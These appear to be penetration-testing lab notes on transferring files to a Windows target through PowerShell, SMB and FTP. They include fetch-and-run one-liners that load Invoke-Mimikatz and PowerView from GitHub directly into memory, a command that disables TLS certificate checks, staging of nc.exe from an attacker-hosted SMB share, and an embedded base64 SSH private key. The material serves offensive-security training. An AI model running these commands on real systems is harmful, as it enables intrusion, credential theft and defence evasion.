# Windows File transfers - Downloads

## Powershell Downloads

### PowerShell Base64 Encode & Decode

**Conditions** : Have access to a terminal

1. Pwnbox Check SSH Key MD5 Hash

md5sum id_rsa

2. Pwnbox Encode SSH Key to Base64

cat id_rsa |base64 -w 0;echo

3. Copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it

[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

4. Confirming the MD5 Hashes Match

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

### PowerShell Web Downloads

**Conditions** : Companies must allow HTTP and HTTPS outbound traffic through the firewall

1. Download file using Powershell methods

a) PowerShell DownloadFile Method

Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')

b) PowerShell DownloadString - Fileless Method

--> download the payload and execute it directly without create a file

IEX = Invoke Expression

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')


(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

c) PowerShell Invoke-WebRequest

Invoke-WebRequest slower than iwr curl wget

Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

### Common Errors with PowerShell

**Error** : 
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine

**Solution** : (-UseBasicParsing)
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

**Error** :
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."

**Solution** :
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

## SMB Downloads

1. Create the SMB Server on the pwn box

sudo impacket-smbserver share -smb2support /tmp/smbshare



2. Copy a File from the SMB Server

copy \\192.168.220.133\share\nc.exe

OR

apt-get install python3-impacket
sudo /usr/local/bin/smbserver.py share -smb2support /workspace/smbshare
copy \\10.10.16.39\share\upload_win.zip

**Error** : organization's security policies block unauthenticated guest access

**Solution** :

3. Create the SMB Server with a Username and Password

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

4. Mount the SMB Server with Username and Password

net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe

## FTP Downloads

1. Installing the FTP Server Python3 Module - pyftpdlib

sudo pip3 install pyftpdlib

By default, pyftpdlib uses port 2121 and Anonymous authentication.

2. Setting up a Python3 FTP Server

sudo python3 -m pyftpdlib --port 21

3. a) Transfering Files from an FTP Server Using PowerShell

(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')

3. b) Create a Command File for the FTP Client and Download the Target File

If we don't have an interactive shell :

echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

-> Launching of FTP download

more file.txt
